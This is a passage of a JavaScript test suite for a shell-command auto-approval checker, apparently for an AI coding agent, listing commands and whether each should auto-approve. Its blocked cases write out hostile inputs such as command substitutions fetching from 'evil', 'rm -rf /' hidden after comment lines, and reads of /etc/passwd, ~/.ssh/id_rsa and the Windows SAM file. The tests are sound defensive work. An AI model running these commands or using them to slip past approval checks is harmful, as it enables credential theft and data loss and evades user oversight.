  { name: 'inline redirect mid-args to allowed path with write enabled auto-approves',
    command: 'grep -l "x" web/js > out.log -r', writeEnabled: true, expected: true },

  // === cat/tee as writers to a permitted target ===
  // `cat > file <<EOF … EOF` reduces (heredoc stripped, redirect stripped) to a
  // bare `cat` — a read-only stdin→stdout copy — so it auto-approves whenever
  // the redirect target is permitted (writeEnabled + in an allowed root).
  { name: 'cat heredoc into an in-project file with write enabled auto-approves',
    command: "cat > out.mjs <<'EOF'\nhello\nEOF", writeEnabled: true, expected: true },
  { name: 'cat heredoc append into a nested in-project file with write enabled auto-approves',
    command: "cat >> sub/dir/out.mjs <<'EOF'\nhello\nEOF", writeEnabled: true, expected: true },
  { name: 'cat heredoc writer WITHOUT write enabled stays blocked',
    command: "cat > out.mjs <<'EOF'\nhello\nEOF", writeEnabled: false, expected: false },
  { name: 'cat heredoc writer to /tmp outside roots stays blocked',
    command: "cat > /tmp/out.mjs <<'EOF'\nhello\nEOF", writeEnabled: true, expected: false },
  { name: 'cat heredoc writer to /tmp WHEN /tmp is an allowed root auto-approves',
    command: "cat > /tmp/out.mjs <<'EOF'\nhello\nEOF", writeEnabled: true, allowedRoots: ['/tmp'], expected: true },
  { name: 'bare cat (stdin→stdout) is read-only and auto-approves',
    command: 'cat', writeEnabled: false, expected: true },
  // tee writes its file operands, so it is gated like a redirect: permitted only
  // with write enabled and every target in-project. As a pipe sink it is
  // stripped and the producer judged on its own.
  { name: 'pipe to tee an in-project file with write enabled auto-approves',
    command: 'grep -rn foo web/js | tee out.log', writeEnabled: true, expected: true },
  { name: 'pipe to tee WITHOUT write enabled stays blocked',
    command: 'grep -rn foo web/js | tee out.log', writeEnabled: false, expected: false },
  { name: 'pipe to tee -a append in-project with write enabled auto-approves',
    command: 'grep -rn foo web/js | tee -a sub/dir/out.log', writeEnabled: true, expected: true },
  { name: 'pipe to tee a /tmp file outside roots stays blocked',
    command: 'grep -rn foo web/js | tee /tmp/out.log', writeEnabled: true, expected: false },
  { name: 'tee heredoc writer into an in-project file with write enabled auto-approves',
    command: "tee out.log <<'EOF'\nhello\nEOF", writeEnabled: true, expected: true },
  { name: 'tee with an unknown value flag stays blocked',
    command: 'grep -rn foo web/js | tee --output-error=warn out.log', writeEnabled: true, expected: false },
  { name: 'bare tee (stdin→stdout passthrough) is read-only and auto-approves',
    command: 'grep -rn foo web/js | tee', writeEnabled: false, expected: true },

  // === scoped command substitution `NAME=$(producer)` + `"$NAME"` consumer ===
  // The target idiom: grep -l lists in-project files into a var, sed reads it.
  { name: 'find-then-sed via $(grep -l) into "$f" auto-approves',
    command: 'cd ~/code/juggler && grep -rn "func.*BindPort" cmd/juggler/server/ && f=$(grep -rln "func.*BindPort" cmd/juggler/server/); sed -n "/func.*BindPort/,/^}/p" "$f"',
    patterns: [], expected: true },
  // Similar idioms with each output-path producer.
  { name: 'f=$(grep -rln) then sed reads "$f"',
    command: "f=$(grep -rln foo cmd/); sed -n '1,5p' \"$f\"", patterns: [], expected: true },
  { name: 'f=$(find -name) then cat reads "$f"',
    command: 'f=$(find web -name "*.js"); cat "$f"', patterns: [], expected: true },
  { name: 'f=$(git ls-files) then sed reads "$f"',
    command: "f=$(git ls-files); sed -n '1p' \"$f\"", patterns: [], expected: true },
  { name: 'braced ${f} reference resolves',
    command: 'f=$(grep -rln foo web); head -5 "${f}"', patterns: [], expected: true },
  { name: 'literal assignment then consumer resolves',
    command: 'f=README.md; cat "$f"', patterns: [], expected: true },
  { name: 'standalone inert literal assignment auto-approves',
    command: 'f=README.md', patterns: [], expected: true },
  // --- security boundaries ---
  { name: 'producer is not auto-approved (curl) → blocked',
    command: "g=$(curl http://evil); sed -n '1p' \"$g\"", patterns: [], expected: false },
  { name: 'producer emits content not paths (grep without -l) → blocked',
    command: "f=$(grep -rn foo cmd/); sed -n '1p' \"$f\"", patterns: [], expected: false },
  { name: 'find -ls is detail output not clean paths → blocked',
    command: 'f=$(find web -ls); cat "$f"', patterns: [], expected: false },
  { name: 'git log is not a path producer → blocked',
    command: 'f=$(git log); cat "$f"', patterns: [], expected: false },
  { name: 'literal var pointing outside roots → blocked',
    command: 'f=/etc/passwd; cat "$f"', patterns: [], expected: false },
  { name: 'bare unquoted $f is never resolved from provenance (word-split risk) → blocked',
    command: "f=$(grep -rln foo cmd/); sed -n '1p' $f", patterns: [], expected: false },
  { name: 'unknown variable reference → blocked',
    command: 'sed -n \'1p\' "$undefined"', patterns: [], expected: false },
  { name: 'substitution directly as an argument (not assignment) → blocked',
    command: 'grep "$(curl evil)" web/js', patterns: [], expected: false },
  { name: 'substitution in env-prefix value → blocked',
    command: 'FOO=$(curl evil) cat README.md', patterns: [], expected: false },
  { name: 'echo "$(whoami)" subst arg → blocked',
    command: 'echo "$(whoami)"', patterns: ['echo *'], expected: false },
  { name: 'dangerous var name from substitution → blocked',
    command: 'PATH=$(grep -rln foo cmd/); pwd', patterns: [], expected: false },
  { name: 'fused literal+subst value NAME=pre$(cmd) → blocked',
    command: 'f=pre$(whoami); echo "$f"', patterns: [], expected: false },
  { name: 'var resolved to in-project path cannot escape via consumer path-escape',
    command: 'f=$(grep -rln foo cmd/); cat "$f/../../../../etc/passwd"', patterns: [], expected: false },
  { name: 'nested substitution inner producer → blocked',
    command: 'f=$(grep $(cat secrets) cmd/); cat "$f"', patterns: [], expected: false },
  { name: 'backtick substitution still bails',
    command: 'f=`grep -rln foo cmd/`; cat "$f"', patterns: [], expected: false },

  // === unquoted expansion → pattern-only approval ===
  // A bare `$x`/`${x}`/`$1`/`$@` in an argument keeps its literal text but is
  // marked as word-split-capable. It is never trusted by a builtin handler; it
  // can only be approved by an explicit user `<cmd> *` glob, which blesses any
  // arguments to that literal head. Word-splitting stays within the arguments —
  // it can neither change the head nor inject a shell operator (both are fixed
  // at parse time, before expansion) — so matching the literal command text is
  // sound. `<cmd> *` already blankets out-of-project literals too (e.g. `cat *`
  // approves `cat /etc/passwd`), so approving `cat $f` under it is consistent.
  { name: 'gh for-loop over issue numbers auto-approves under gh *',
    command: `for n in 24 23; do echo "== issue $n =="; gh api repos/o/r/issues/$n --jq '.title'; done`,
    patterns: ['gh *'], expected: true },
  { name: 'gh api with unquoted $n but no gh pattern prompts',
    command: 'gh api repos/o/r/issues/$n', patterns: [], expected: false },
  { name: 'unquoted ${n} braced form also matches gh *',
    command: 'gh api repos/o/r/issues/${n}', patterns: ['gh *'], expected: true },
  { name: 'unquoted $f arg to a handler is NOT rescued by the handler even in-project',
    command: 'cat $f', patterns: [], expected: false },
  { name: 'unquoted $f arg to cat auto-approves only under an explicit cat * grant',
    command: 'cat $f', patterns: ['cat *'], expected: true },
  { name: 'unquoted var head with no matching pattern prompts',
    command: '$cmd api foo', patterns: ['gh *'], expected: false },
  // Sink-tail guard: a stripped `| <sink>` stage must not carry an unquoted
  // expansion (word-splits a value into an extra file arg) or a command
  // substitution (would be discarded unvetted with the stripped stage).
  { name: 'unquoted $y in a grep sink blocks sink-stripping → prompts',
    command: 'echo hi | grep $y', patterns: [], expected: false },
  { name: 'command substitution in a grep sink is not stripped-and-ignored → prompts',
    command: 'echo hi | grep $(whoami)', patterns: [], expected: false },

  // === uniq as a read-only pipeline filter / sink ===
  { name: 'grep | sort | uniq -c | sort -rn | head pipeline auto-approves',
    command: 'cd ~/code/juggler && echo "=== imports ===" && grep -rhn "^import" web/extensions/juggler-core/context-items/*.js | grep -v "plugins" | sort | uniq -c | sort -rn | head -40',
    patterns: [], expected: true },
  { name: 'uniq -c as a sink auto-approves',
    command: 'grep -rn foo web | sort | uniq -c', patterns: [], expected: true },
  { name: 'uniq with value flags (-f N -s N -w N) as a sink auto-approves',
    command: 'grep -rn foo web | uniq -f 2 -s3 -iw5', patterns: [], expected: true },
  { name: 'uniq reading an in-project file at top level auto-approves',
    command: 'uniq -c web/js/main.js', patterns: [], expected: true },
  // --- security boundaries ---
  { name: 'uniq with a second positional (output file) → blocked',
    command: 'grep -rn foo web | uniq -c out.txt', patterns: [], expected: false },
  { name: 'uniq INPUT OUTPUT at top level (output file write) → blocked',
    command: 'uniq input.txt output.txt', patterns: [], expected: false },
  { name: 'uniq with a positional in sink position → blocked',
    command: 'grep -rn foo web | uniq /etc/passwd', patterns: [], expected: false },
  { name: 'uniq reading a file outside roots → blocked',
    command: 'uniq /etc/passwd', patterns: [], expected: false },
  { name: 'uniq with an unknown flag → blocked',
    command: 'grep -rn foo web | uniq --zap', patterns: [], expected: false },
  { name: 'uniq with a non-numeric flag value → blocked',
    command: 'grep -rn foo web | uniq -f x', patterns: [], expected: false },

  // === cut as a read-only column/field filter / sink ===
  { name: 'grep | sed | sed | cut | sort | uniq | sort pipeline auto-approves',
    command: 'cd ~/code/juggler && echo "=== targets ===" && grep -rhoE "from \'(\\.\\./)+[^\']+\'" web/extensions/juggler-core/context-items | sed -E "s/from \'//; s/\'//" | sed -E \'s#^(\\.\\./)+##\' | cut -d/ -f1-2 | sort | uniq -c | sort -rn',
    patterns: [], expected: true },
  { name: 'cut -d/ -f1-2 as a sink auto-approves',
    command: 'grep -rn foo web | cut -d/ -f1-2', patterns: [], expected: true },
  { name: 'cut with separate-value flags as a sink auto-approves',
    command: 'grep -rn foo web | cut -d : -f 1', patterns: [], expected: true },
  { name: 'cut with long flags + --complement as a sink auto-approves',
    command: 'grep -rn foo web | cut --delimiter=, --fields=2 --complement', patterns: [], expected: true },
  { name: 'cut reading an in-project file at top level auto-approves',
    command: 'cut -f1 -d, web/data.csv', patterns: [], expected: true },
  // --- security boundaries ---
  { name: 'cut with a file positional in sink position → blocked',
    command: 'grep -rn foo web | cut -f1 /etc/passwd', patterns: [], expected: false },
  { name: 'cut reading a file outside roots → blocked',
    command: 'cut -f1 /etc/passwd', patterns: [], expected: false },
  { name: 'cut with an unknown flag → blocked',
    command: 'grep -rn foo web | cut --zap', patterns: [], expected: false },
  { name: 'cut with a value flag missing its value → blocked',
    command: 'grep -rn foo web | cut -f', patterns: [], expected: false },

  // === tr as a read-only character filter / sink (never touches files) ===
  { name: 'grep | sed | tr | sed import-collecting pipeline auto-approves',
    command: 'cd ~/code/juggler && grep -rhn "from \'\\.\\./\\.\\?\\.\\?/\\?js/" web/extensions/juggler-core --include="*.js" -B3 | grep -E "import|from \'" | grep -v "^--" | sed "s/^[0-9]*[:-]//" | tr \'\\n\' \' \' | sed \'s/import/\\nimport/g\'',
    patterns: [], expected: true },
  { name: 'tr translating newlines to spaces as a sink auto-approves',
    command: 'grep -rn foo web | tr "\\n" " "', patterns: [], expected: true },
  { name: 'tr -d deleting a set as a sink auto-approves',
    command: 'grep -rn foo web | tr -d "\\r"', patterns: [], expected: true },
  { name: 'tr -s squeeze + -c complement clustered as a sink auto-approves',
    command: 'echo foo | tr -cs "a-zA-Z" "\\n"', patterns: [], expected: true },
  { name: 'tr with long flags as a sink auto-approves',
    command: 'echo foo | tr --complement --squeeze-repeats "a-z" "x"', patterns: [], expected: true },
  { name: 'tr with a set that begins with a dash (after --) auto-approves',
    command: 'echo foo | tr -- "-" "_"', patterns: [], expected: true },
  { name: 'tr at top level (no file arg) auto-approves',
    command: 'tr "a-z" "A-Z"', patterns: [], expected: true },
  // Negative
  { name: 'tr with an unknown short flag → blocked',
    command: 'grep -rn foo web | tr -z "a" "b"', patterns: [], expected: false },
  { name: 'tr with an unknown long flag → blocked',
    command: 'grep -rn foo web | tr --zap "a" "b"', patterns: [], expected: false },

  // === Multi-line scripts: newline = `;` separator, every line validated ===
  { name: 'two safe lines auto-approve (newline as separator)',
    command: 'pwd\nls web', patterns: [], platform: 'darwin', expected: true },
  { name: 'blank lines between safe commands collapse (no empty segment)',
    command: 'pwd\n\n\nls web', patterns: [], platform: 'darwin', expected: true },
  { name: 'full-line # comment between safe commands is ignored',
    command: 'pwd\n# list the web dir\nls web', patterns: [], platform: 'darwin', expected: true },
  { name: 'leading # comment line is ignored',
    command: '# do a couple of safe things\npwd\nls web', patterns: [], platform: 'darwin', expected: true },
  { name: 'trailing # comment line is ignored',
    command: 'pwd\nls web\n# all done', patterns: [], platform: 'darwin', expected: true },
  { name: 'comment lines do not smuggle an unsafe command past approval',
    command: '# harmless looking\npwd\nrm -rf /', patterns: [], platform: 'darwin', expected: false },
  { name: 'a # commented-out dangerous line is inert (approves the real safe line)',
    command: '# rm -rf /\nls web', patterns: [], platform: 'darwin', expected: true },
  { name: 'inline # comment after a safe command is ignored',
    command: 'ls web # list files', patterns: [], platform: 'darwin', expected: true },
  { name: 'mid-word # is literal, not a comment (unknown command prompts)',
    command: 'foo#bar', patterns: [], platform: 'darwin', expected: false },
  { name: 'multi-line where a later line is unsafe prompts',
    command: 'pwd\nls web\nrm -rf /', patterns: [], platform: 'darwin', expected: false },
  { name: 'backslash-newline line continuation joins one safe command',
    command: 'ls \\\nweb', patterns: [], platform: 'darwin', expected: true },
  { name: 'line ending in && continues to next line (no synthesized separator)',
    command: 'echo hi &&\necho bye', patterns: [], platform: 'darwin', expected: true },
  { name: 'line ending in | continues a pipeline across the newline',
    command: 'grep -rn foo web |\nhead -20', patterns: [], platform: 'darwin', expected: true },
  { name: 'reported multi-line grep survey auto-approves',
    command: `cd ~/code/juggler && echo "=== AnyActive exposure + any cancel-all endpoint ===" && grep -rn "AnyActive\\|active.*conversation\\|/api/health/instance\\|activeConversations\\|cancelAll" cmd/juggler/server/*.go cmd/juggler/server/handlers/*.go | head -15
echo ""
echo "=== frontend: any 'stop all' / iterate active convs ===" && grep -rn "cancelAndSettle\\|isProcessing\\|stopAll\\|for .*conversations" web/js/model/session.js web/js/services/*.js | grep -i 'cancel\\|processing\\|stop' | head`,
    patterns: [], platform: 'darwin', expected: true },

  // === test / [ conditional (read-only predicate, in-project paths only) ===
  { name: 'reported test -x guard auto-approves',
    command: 'cd ~/code/juggler && test -x bin/juggler && echo "bin/juggler exists" || echo "need go-build"',
    patterns: [], platform: 'darwin', expected: true },
  { name: 'test -f of in-project file is safe',
    command: 'test -f web/js/app.js', patterns: [], platform: 'darwin', expected: true },
  { name: 'test -d of in-project dir is safe',
    command: 'test -d web', patterns: [], platform: 'darwin', expected: true },
  { name: 'bracket form [ -x PATH ] of in-project file is safe',
    command: '[ -x bin/juggler ]', patterns: [], platform: 'darwin', expected: true },
  { name: 'leading ! negation of an in-project file test is safe',
    command: 'test ! -f web/js/app.js', patterns: [], platform: 'darwin', expected: true },
  { name: 'test -z of empty string is safe (no FS)',
    command: "test -z ''", patterns: [], platform: 'darwin', expected: true },
  { name: 'test string equality is safe (no FS)',
    command: 'test abc = abc', patterns: [], platform: 'darwin', expected: true },
  { name: 'test integer comparison is safe',
    command: 'test 1 -eq 1', patterns: [], platform: 'darwin', expected: true },
  { name: 'no-arg test is inert and safe',
    command: 'test', patterns: [], platform: 'darwin', expected: true },
  { name: 'test -f of an absolute path outside project prompts',
    command: 'test -f /etc/passwd', patterns: [], platform: 'darwin', expected: false },
  { name: 'test -r of a sensitive file under home prompts',
    command: 'test -r ~/.ssh/id_rsa', patterns: [], platform: 'darwin', expected: false },
  { name: 'test -f of an escaping relative path prompts',
    command: 'test -f ../../etc/passwd', patterns: [], platform: 'darwin', expected: false },
  { name: 'bracket form without closing ] prompts',
    command: '[ -f web/js/app.js', patterns: [], platform: 'darwin', expected: false },
  { name: 'integer comparison with a non-integer operand prompts',
    command: 'test 1 -eq abc', patterns: [], platform: 'darwin', expected: false },
  { name: 'unknown test operator prompts',
    command: 'test -Q web', patterns: [], platform: 'darwin', expected: false },
  { name: 'conservative: -o conjunction is not decomposed and prompts',
    command: 'test -f web/a -o -f web/b', patterns: [], platform: 'darwin', expected: false },

  // === Working directory: `cd` moves where relative paths are judged ==========
  // The pattern that motivates all of this: `cd` somewhere, then read a path
  // relative to there. Judged from the project root the `../../` looks like an
  // escape; judged from where it runs, it is an ordinary in-project read.
  { name: 'cd deep then ../.. path back inside the project',
    command: 'cd web/extensions/juggler-core && grep -rn "summarise-command" ../../js-tests/ ../../js/',
    patterns: [], platform: 'darwin', expected: true },
  { name: 'the reported command: cd, in-dir grep, comment echo, then ../.. grep with sinks',
    command: 'cd /Users/jules/code/juggler/web/extensions/juggler-core && grep -n "summarise\\|compact-command" juggler.extension.json; echo "=== executor ref"; grep -rn "summarise-command" ../../js-tests/ ../../js/ 2>/dev/null | head',
    patterns: [], platform: 'darwin', expected: true },
  { name: 'cd then read a sibling directory',
    command: 'cd web && cat ../cmd/juggler/main.go', patterns: [], platform: 'darwin', expected: true },
  { name: 'cd tracked across a multi-step chain',
    command: 'cd web && grep -rn X js && cd ../cmd && grep -rn Y juggler',
    patterns: [], platform: 'darwin', expected: true },
  { name: 'cd separated by ; still moves the directory',
    command: 'cd web; ls js', patterns: [], platform: 'darwin', expected: true },
  // The escapes stay escapes: following the `cd` narrows nothing away.
  { name: 'cd then a path that escapes the project prompts',
    command: 'cd web && cat ../../../etc/passwd', patterns: [], platform: 'darwin', expected: false },
  { name: 'cd chain that walks out of the project prompts',
    command: 'cd web && cd ../../.. && ls', patterns: [], platform: 'darwin', expected: false },
  { name: 'cd deep then a ../ path that still lands outside prompts',
    command: 'cd web/js && grep -rn X ../../../../etc', patterns: [], platform: 'darwin', expected: false },
  // A subshell's `cd` dies with the subshell, so the command after it runs
  // where it always did — and `../js` from the project root is outside it.
  { name: 'subshell cd does not move the directory for later segments',
    command: '(cd web) && cat ../js/app.js', patterns: [], platform: 'darwin', expected: false },
  { name: 'subshell cd applies inside the subshell',
    command: '(cd web && cat ../cmd/juggler/main.go)', patterns: [], platform: 'darwin', expected: true },
  // A brace group runs in the current shell, so its `cd` does persist.
  { name: 'brace group cd persists into later segments',
    command: '{ cd web; }; cat ../cmd/juggler/main.go', patterns: [], platform: 'darwin', expected: true },
  // A relative path that leaves the project but lands in another granted root
  // is a read the user has already permitted — decidable only with a cwd.
  { name: 'relative path into a second allowed root',
    command: 'cat ../notes/todo.md', patterns: [], platform: 'darwin',
    allowedRoots: [PROJECT_ROOT, '/Users/jules/code/notes'], expected: true, expectedNoCwd: false },
  { name: 'relative path out of every allowed root prompts',
    command: 'cat ../notes/todo.md', patterns: [], platform: 'darwin', expected: false },
  { name: 'write redirect into a second allowed root via a relative path',
    command: 'echo hi > ../notes/out.log', patterns: [], platform: 'darwin', writeEnabled: true,
    allowedRoots: [PROJECT_ROOT, '/Users/jules/code/notes'], expected: true, expectedNoCwd: false },
  // A user glob may not bless a read outside the allowed roots, however the
  // path is spelled — the relative form is resolved before that rule applies.
  { name: 'grep * does not bless an out-of-root read spelled relatively',
    command: 'grep -rn X ../../other-repo', patterns: ['grep *'], platform: 'darwin',
    expected: false, expectedNoCwd: true },
  { name: 'grep * does not bless the same read spelled absolutely',
    command: 'grep -rn X /Users/jules/other-repo', patterns: ['grep *'], platform: 'darwin', expected: false },
  // Windows: the project path arrives OS-native (backslashes) and must fold to
  // the same location as the forward-slash spelling the command uses.
  { name: 'windows backslash cwd resolves a relative cd and path',
    command: 'cd web && cat ../cmd/juggler/main.go', patterns: [], platform: 'windows',
    allowedRoots: ['C:\\Users\\jules\\code\\juggler'], cwd: 'C:\\Users\\jules\\code\\juggler', expected: true },
  { name: 'windows backslash cwd still refuses an escaping path',
    command: 'cd web && cat ../../../Windows/System32/config/SAM', patterns: [], platform: 'windows',
    allowedRoots: ['C:\\Users\\jules\\code\\juggler'], cwd: 'C:\\Users\\jules\\code\\juggler', expected: false },
];

/**
 * @typedef {object} SuggestCase
 * @property {string} name human-readable label for the case
 * @property {string} command the command line being tested
 * @property {string[]} [patterns] patterns already enabled
 * @property {string[]} [allowedRoots] allowed roots (default [PROJECT_ROOT])
 * @property {string} [platform] platform identifier string (default 'darwin')
 * @property {boolean} [writeEnabled] whether write operations are permitted
 * @property {string} [cwd] directory the command runs in (default PROJECT_ROOT)
 * @property {Array<string[] | {allowedPaths: string[]}>} expected ordered
 *   escalating suggestions. A `string[]` entry is that suggestion's glob-pattern
 *   list; a `{allowedPaths}` entry is a path-grant suggestion (folders to add to
 *   the allowed-paths list). `[]` means "no smart suggestion".
 */

/** @type {SuggestCase[]} */
const SUGGEST_CASES = [
  // Simple tool with no handler → exact, then command-wildcard.
  { name: 'make build → exact then make *',
    command: 'make build', expected: [['make build'], ['make *']] },
  // git write subcommand → exact, subcommand-wildcard, command-wildcard.
  { name: 'git push origin main → 3 escalating tiers',
    command: 'git push origin main',
    expected: [['git push origin main'], ['git push *'], ['git *']] },
  // Leading `cd <in-project> &&` is stripped before analysis.
  { name: 'cd project + make build → make tiers',
    command: 'cd ~/code/juggler && make build',
    expected: [['make build'], ['make *']] },
  // Trailing sinks are stripped before analysis.
  { name: 'make build 2>&1 | tail → make tiers',
    command: 'make build 2>&1 | tail -50',
    expected: [['make build'], ['make *']] },
  // Multi-segment: each tier combines one pattern per rejected segment.
  { name: 'npm test && git push → combined escalating tiers',
    command: 'npm test && git push origin main',
    expected: [
      ['npm test', 'git push origin main'],
      ['npm *', 'git push *'],
      ['npm *', 'git *']
    ] },
  // A segment already covered by a handler is not re-suggested.
  { name: 'git status && make build → only make needs a pattern',
    command: 'git status && make build',
    expected: [['make build'], ['make *']] },
  // A leading comment line is inert: it must not be offered as a pattern; the
  // suggestion covers only the real command that needs approval.
  { name: 'comment line before make build → only make is suggested, not the comment',
    command: '# build the app\nmake build',
    expected: [['make build'], ['make *']] },
  // A segment already covered by an enabled pattern is not re-suggested.
  { name: 'npm test && make build with npm * enabled → only make',
    command: 'npm test && make build', patterns: ['npm *'],
    expected: [['make build'], ['make *']] },
  // Interpreters are never wildcarded — exact only.
  { name: 'bash run.sh → exact only (interpreter)',
    command: 'bash run.sh', expected: [['bash run.sh']] },
  // A heredoc is stripped before analysis, so the suggested pattern covers the
  // underlying command (`python3 -`), not the verbatim multi-line body.
  { name: 'interpreter heredoc → exact pattern over the stripped command',
    command: "python3 - <<'PY'\nprint(1)\nPY", expected: [['python3 -']] },
  // Already auto-approved → nothing to suggest.
  { name: 'echo hello → already safe, no suggestion',
    command: 'echo hello world', expected: [] },
  { name: 'git log → read-only handler approves, no suggestion',
    command: 'git log', expected: [] },
  // Unanalyzable shapes bail to [] (caller falls back to exact whole command).
  { name: 'command substitution → no suggestion',
    command: 'npm install $(curl evil)', expected: [] },
  { name: 'control-flow loop → no suggestion',
    command: 'for i in 1 2; do rm "$i"; done', expected: [] },
  // A grouped segment is too complex to suggest a minimal pattern for — bail
  // rather than offer a garbage `(echo *` suggestion. (Here the make>/tmp
  // redirect is also unstrippable without write perms, so the segment loop
  // bails before the group anyway; either way → no suggestion.)
  { name: 'subshell group in || branch → no suggestion (not (echo *)',
    command: 'cd ~/code/juggler && make go-build >/tmp/gobuild.log 2>&1 && echo "BUILD OK" || (echo "BUILD FAIL"; tail -20 /tmp/gobuild.log)',
    patterns: ['make *'], expected: [] },
  { name: 'non-null write redirect leaves an op → no pattern can cover it',
    command: 'echo hi > local-file', expected: [] },
  { name: 'cd escaping project → no suggestion',
    command: 'cd /tmp && make build', expected: [] },
  // Over-long exact tier is dropped; the short wildcard tier survives.
  { name: 'very long make command → exact tier dropped, make * kept',
    command: 'make ' + 'a'.repeat(160), expected: [['make *']] },
  // Interpreter has no wildcard tier, so an over-long exact tier leaves nothing.
  { name: 'very long interpreter command → no suggestion (exact too long, no wildcard)',
    command: 'bash ' + 'a'.repeat(160), expected: [] },
  // Build-with-logfile: write redirects to an allowed path are stripped when
  // write permission is on, leaving just the cmake segment to pattern. The cd
  // target, the redirect targets, and the trailing echo-to-logfile all reduce
  // away, so only cmake needs a rule.
  { name: 'cmake build > logfile (write enabled, /tmp in roots) → cmake tiers',
    command: 'cd /tmp/proj && cmake --build --preset xcode_Release -- -quiet > /tmp/wf.log 2>&1 ; echo "done" >> /tmp/wf.log',
    allowedRoots: ['/tmp'], writeEnabled: true,
    expected: [
      ['cmake --build --preset xcode_Release -- -quiet'],
      ['cmake *']
    ] },
  // Same command WITHOUT write permission: the redirect leaves a leftover op
  // no glob can cover, so there's no honest suggestion.
  { name: 'cmake build > logfile WITHOUT write permission → no suggestion',
    command: 'cmake --build -- -quiet > /tmp/wf.log 2>&1',
    allowedRoots: ['/tmp'], writeEnabled: false, expected: [] },
  // Real-world build command: leading in-project cd stripped, cmake segment
  // reduced past `2>&1 | grep | tail` sinks, trailing `echo "...${PIPESTATUS[0]}"`
  // segment is already safe. Only cmake needs a pattern.
  { name: 'cd project && cmake | grep | tail ; echo ${PIPESTATUS} → cmake tiers',
    command: 'cd ~/code/juggler && cmake --build --preset xcode_Release --target Waveform14 --config Debug -- -quiet 2>&1 | grep -E "error:|BUILD FAILED" | tail -30; echo "EXIT=${PIPESTATUS[0]}"',
    expected: [
      ['cmake --build --preset xcode_Release --target Waveform14 --config Debug -- -quiet'],
      ['cmake *']
    ] },

  // === Path-grant suggestions ===
  // A read-only command rejected ONLY because it reaches outside the allowed
  // roots offers a folder/path grant — the targeted fix — and dry-run filtering
  // suppresses glob tiers that would still fail because they don't grant the path.
  { name: 'recursive grep into ~/go (out of roots) → grant the folder',
    command: 'grep -r "CreateJobObject\\|AssignProcessToJob\\|JOB_OBJECT_LIMIT" ~/go/pkg/mod/golang.org/x/sys@v0.44.0/windows/ 2>/dev/null | head -40',
    expected: [
      { allowedPaths: ['/Users/jules/go/pkg/mod/golang.org/x/sys@v0.44.0/windows'] }
    ] },
  { name: 'find ~/go | xargs grep -l (out of roots) → grant the find root first',
    command: 'find ~/go/pkg/mod/golang.org/x/sys@v0.44.0/windows/ -name "*.go" | xargs grep -l "JobObject" 2>/dev/null | head -5',
    expected: [
      { allowedPaths: ['/Users/jules/go/pkg/mod/golang.org/x/sys@v0.44.0/windows'] }
    ] },
  // Bare grep over an out-of-root absolute path (no recursion) → grant it first.
  { name: 'grep over an absolute out-of-root file → grant the folder first',
    command: 'grep "JobObject" /opt/sdk/windows/job.go',
    expected: [
      { allowedPaths: ['/opt/sdk/windows/job.go'] }
    ] },
  { name: 'bare path-looking grep positional → grant the path, not grep wildcard',
    command: 'grep /tmp/foo',
    expected: [
      { allowedPaths: ['/tmp/foo'] }
    ] },
  { name: 'du over an absolute out-of-root path → grant it first',
    command: 'du -sh /opt/sdk/windows',
    expected: [
      { allowedPaths: ['/opt/sdk/windows'] }
    ] },
  // `find` whose forbidden predicate (-delete) makes it unsafe for a reason
  // OTHER than the path → no honest path grant; falls back to glob tiers only.
  { name: 'find ~/go -delete → not a pure path obstacle, glob tiers only',
    command: 'find ~/go/pkg -name foo.tmp -delete',
    expected: [['find ~/go/pkg -name foo.tmp -delete'], ['find *']] },
  // home IS known, grep is recursive over a grantable folder → grant it first.
  { name: 'recursive grep into ~/Documents → grant ~/Documents first',
    command: 'grep -rn "TODO" ~/Documents/notes',
    expected: [
      { allowedPaths: ['/Users/jules/Documents/notes'] }
    ] },
  // `ls` of an out-of-root folder offers the folder grant first (not just `ls *`).
  { name: 'ls of an out-of-root folder → grant the folder first',
    command: 'ls -la ~/.juggler/ 2>/dev/null',
    expected: [
      { allowedPaths: ['/Users/jules/.juggler'] }
    ] },
  // Compound listing of several out-of-root folders: the path-grant tier unions
  // every listed folder so one grant covers the whole command (echo segments are
  // already safe and contribute nothing).
  { name: 'echo + multiple ls into ~/.juggler subdirs → union folder grant first',
    command: 'echo "=== ~/.juggler tree (logs + app) ===" && ls -la ~/.juggler/ 2>/dev/null && echo "--- logs/ ---" && ls -la ~/.juggler/logs/ 2>/dev/null && echo "--- app/ ---" && ls -la ~/.juggler/app/ 2>/dev/null',
    expected: [
      { allowedPaths: ['/Users/jules/.juggler', '/Users/jules/.juggler/logs', '/Users/jules/.juggler/app'] }
    ] },

  // Read-only file readers reach the same path-grant tier: a command rejected
  // ONLY because the file it reads sits outside the allowed roots offers to
  // grant that file/folder first, not just a `<cmd> *` wildcard.
  { name: 'sed -n reading an out-of-root file → grant the file first',
    command: "cd ~/code/juggler && sed -n '120,230p' /Users/jules/go/pkg/mod/github.com/mdp/qrterminal/v3@v3.2.1/qrterminal.go",
    expected: [
      { allowedPaths: ['/Users/jules/go/pkg/mod/github.com/mdp/qrterminal/v3@v3.2.1/qrterminal.go'] }
    ] },
  { name: 'cat of an out-of-root file → grant the file first',
    command: 'cat /opt/sdk/windows/notes.txt',
    expected: [
      { allowedPaths: ['/opt/sdk/windows/notes.txt'] }
    ] },
  { name: 'head of an out-of-root file → grant the file first',
    command: 'head -50 /opt/sdk/windows/job.go',
    expected: [
      { allowedPaths: ['/opt/sdk/windows/job.go'] }
    ] },
  { name: 'sort of an out-of-root file → grant the file first',
    command: 'sort /opt/sdk/data/lines.txt',
    expected: [
      { allowedPaths: ['/opt/sdk/data/lines.txt'] }
    ] },
  { name: 'stat of an out-of-root file → grant the file first',
    command: 'stat /opt/sdk/windows/job.go',
    expected: [
      { allowedPaths: ['/opt/sdk/windows/job.go'] }
    ] },
  // sed `w` (write-file) is unsafe for a reason OTHER than the path → granting
  // the read path can't rescue it, so no path-grant tier (glob tiers only).
  { name: 'sed with a w (write) command out-of-root → not a pure path obstacle',
    command: "sed -n 'w /tmp/leak' /opt/sdk/windows/job.go",
    expected: [["sed -n 'w /tmp/leak' /opt/sdk/windows/job.go"], ['sed *']] },

  // === Over-broad roots are NEVER offered as a folder grant (sanity gate) ===
  // The path IS the sole obstacle, but the root is too broad to grant — and a
  // `<cmd> *` wildcard would drop the very in-root-path restriction that was
  // violated (and blanket-approve destructive forms the handler forbids). So no
  // path-grant tier AND no wildcard tier: offer the exact command only.
  // `find /` walks the whole filesystem; granting `/` would blanket-approve every
  // future read, and `find *` would auto-approve `find / -delete` / `-exec`.
  { name: 'find / (filesystem root) → never grant /, no find * wildcard, exact only',
    command: 'find / -name foo.go 2>/dev/null | head -3',
    expected: [['find / -name foo.go']] },
